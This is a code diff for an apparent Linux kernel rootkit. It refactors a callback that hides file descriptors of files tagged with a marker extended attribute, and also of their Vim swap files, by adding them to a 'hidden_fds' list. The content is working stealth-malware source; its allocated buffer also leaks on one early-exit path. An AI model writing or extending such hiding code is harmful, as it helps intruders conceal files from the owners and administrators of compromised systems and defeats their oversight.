@@ -115,47 +115,43 @@ fd_callback(const void *ptr, struct file *f, unsigned fd)
         ssize_t len = vfs_getxattr(f->f_path.dentry, G7_XATTR_NAME, buf, BUFLEN);
 
         if (len > 0 && !strncmp(G7_XATTR_VAL, buf, strlen(G7_XATTR_VAL))) {
-            add_fd_to_list(&hidden_fds, (int) fd);
+            add_fd_to_list(&hidden_fds, (int)fd);
             goto leave;
         }
 
-        const char *fname = f->f_path.dentry->d_name.name;
+        { // Rather hideous hack to account for Vim-{specific,default} swap files
+            const char *fname = f->f_path.dentry->d_name.name;
 
-        if (strlen(fname) >= 6) {
-            char *abs = kzalloc(BUFLEN, GFP_KERNEL);
+            if (strlen(fname) >= 6) {
+                char *abs = kzalloc(BUFLEN, GFP_KERNEL);
 
-            if (strncmp(fname, ".", 1) || strncmp((fname + (strlen(fname) - 4)), ".swp", 4)) {
-                goto leave;
-            }
+                if (strncmp(fname, ".", 1) || strncmp((fname + (strlen(fname) - 4)), ".swp", 4))
+                    goto leave;
 
+                memset(buf, 0, BUFLEN);
+                strncpy(buf, (fname + 1), strlen(fname) - 5);
 
-            memset(buf, 0, BUFLEN);
-            strncpy(buf, (fname + 1), strlen(fname) - 5);
+                char *pathname = d_path(&f->f_path, abs, 512);
+                if (IS_ERR(pathname))
+                    goto end;
 
-            char *path = d_path(&f->f_path, abs, 512);
+                memset((pathname + (strlen(pathname) - strlen(fname))), 0, strlen(fname));
+                strcat(pathname, buf);
 
-            if (IS_ERR(path))
-                goto end;
+                struct path path;
+                if (kern_path(pathname, LOOKUP_FOLLOW, &path))
+                    goto end;
 
-            memset((path + (strlen(path) - strlen(fname))), 0, strlen(fname));
-            strcat(path, buf);
+                memset(buf, 0, BUFLEN);
+                ssize_t len = vfs_getxattr(path.dentry, G7_XATTR_NAME, buf, BUFLEN);
 
-            struct path path_struct;
-            if (kern_path(path, LOOKUP_FOLLOW, &path_struct))
-                goto end;
-
-            memset(buf, 0, BUFLEN);
-
-            ssize_t len = vfs_getxattr(path_struct.dentry, G7_XATTR_NAME, buf, BUFLEN);
-
-            if (len > 0 && !strncmp(G7_XATTR_VAL, buf, strlen(G7_XATTR_VAL))) {
-                add_fd_to_list(&hidden_fds, (int) fd);
-            }
+                if (len > 0 && !strncmp(G7_XATTR_VAL, buf, strlen(G7_XATTR_VAL)))
+                    add_fd_to_list(&hidden_fds, (int)fd);
 
 end:
-            kfree(abs);
-            goto leave;
-
+                kfree(abs);
+                goto leave;
+            }
         }
     }
 
